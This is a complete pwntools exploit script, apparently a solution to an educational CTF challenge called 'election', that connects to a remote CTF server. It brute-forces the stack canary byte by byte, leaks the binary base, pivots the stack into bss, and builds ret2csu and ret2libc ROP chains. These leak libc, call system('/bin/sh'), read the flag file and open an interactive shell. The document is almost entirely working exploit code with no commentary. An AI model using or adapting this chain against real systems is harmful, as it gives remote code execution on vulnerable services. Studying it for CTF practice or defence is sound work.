#!/usr/bin/python3
from pwn import *
context.arch = 'amd64'

pop_rbp     = 0xa40
pop_rdi     = 0x11a3
pop_rsi_r15 = 0x11a1
leave_ret   = 0xbe9
ret         = 0x906
csu_pop     = 0x119a
csu_call    = 0x1180

p = remote('edu-ctf.csie.org', 10180)
# p = process('./election')
e = ELF('./election')
libc = ELF('./libc.so')

counter = 0

def Vote(candidate):
    global counter
    info('Vote {} {}'.format(candidate, counter))
    counter += 1

    p.sendlineafter(b'>\x0a', str(1))
    p.sendlineafter(b'[0~9]: ', str(candidate))

def Message(candidate, msg, newline=True):
    p.sendlineafter(b'>\x0a', str(2))
    p.sendlineafter(b'[0~9]: ', str(candidate))
    if(newline == False):
        p.sendafter(b': ', msg)
    else:
        p.sendlineafter(b': ', msg)

def Logout():
    p.sendlineafter(b'>\x0a', str(3))

def Login(Token):
    p.sendlineafter(b'>\x0a', str(1))
    p.sendlineafter(b': ', Token)

def Register(Token):
    p.sendlineafter(b'>\x0a', str(2))
    p.sendlineafter(b': ', Token)

def Vote255(Token):
    for i in range(25):
        Register(Token)
        Login(Token)
        for j in range(10):
            Vote(3)
        Logout()
    
    Register(Token)
    Login(Token)
    for j in range(5):
        Vote(3)

padding = b'a' * 0xb8
Register(padding)

leak = b'\x00'
_temp = 0
while True:
    info('trying brute force canary & old rbp {}, {}'.format(leak, _temp))
    p.sendlineafter(b'>\x0a', str(1))
    p.sendafter(b': ', padding + leak + bytes([_temp]))
    msg = p.recv(3)
    if msg != b'Inv':
        if len(leak) == 8 + 6:
            Logout()
            break
        else:
            Logout()
            Register(b'a' * 0xb8)
            leak += bytes([_temp])
            _temp = 0
    else:
        _temp += 1
canary    = u64(leak[:8])
e.address = u64(leak[8:] + b'\x00\x00') - 0x1140

info('canary: {}'.format(hex(canary)))
info('code base: {}'.format(hex(e.address)))

Vote255('a')

# Do stack pivoting trick
payload = b'a' * 0xe8 + p64(canary) + p64(e.bss() + 0xa00)
Message(3, payload, newline=False)
Logout()

# Write ROP chain into bss
# Leak libc
rop = flat(
    e.address + pop_rdi,
    e.got['__libc_start_main'],
    e.plt['puts'],

    e.address + csu_pop,
    e.bss() + 0xa00 - 1,                        # rbx
    e.bss() + 0xa00,                            # rbp
    e.got['read'] - (e.bss() + 0xa00 - 1) * 8,  # r12 (function pointer)
    0,                                          # r13 (rdi)
    e.bss() + 0x800,                            # r14 (rsi)
    0xff,                                       # r15 (rdx)
    e.address + csu_call,
    0,                                          # padding for add rsp, 0x8
    0,                                          # rbx
    e.bss() + 0x800 - 0x8,                      # rbp
    0,                                          # r12
    0,                                          # r13
    0,                                          # r14
    0,                                          # r15
    e.address + leave_ret)

info('write token to: {}'.format(hex(e.bss() + 0xa00 - 0xc0)))

Register(rop)
Login(rop)
# Jmp to ROP chain at bss
payload = b'a' * 0xe8 + p64(canary) + p64(e.bss() + 0xa00 - 0xc0 - 0x8) + p64(e.address + leave_ret)[:7]
Message(3, payload, newline=False)
Logout()

libc.address = u64(p.recv(6) + b'\x00\x00') - libc.symbols['__libc_start_main']
info('libc: {}'.format(hex(libc.address)))

rop = flat(
        e.address + pop_rdi,
        next(libc.search(b'/bin/sh\x00')),
        libc.symbols['system'])
payload = rop
sleep(0.1)
p.sendline(payload)
sleep(0.1)
p.sendline(b'cat /home/`whoami`/flag')
p.interactive()
